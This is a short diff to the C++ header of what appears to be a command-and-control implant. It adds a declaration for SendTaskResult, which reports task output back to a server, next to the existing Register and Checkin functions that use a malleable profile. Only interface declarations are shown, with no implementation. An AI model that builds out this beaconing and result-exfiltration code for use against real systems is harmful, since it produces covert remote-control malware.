@@ -25,4 +25,9 @@ MalleableProfile* Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
 */
 Task* Checkin(LPCWSTR serverUrl, MalleableProfile *profile);
 
+/**
+ * Sends the results of a task to the server at the given URL. Returns true if successful, false otherwise.
+*/
+bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool success, MalleableProfile *profile);
+
 #endif // IMPLANT_H
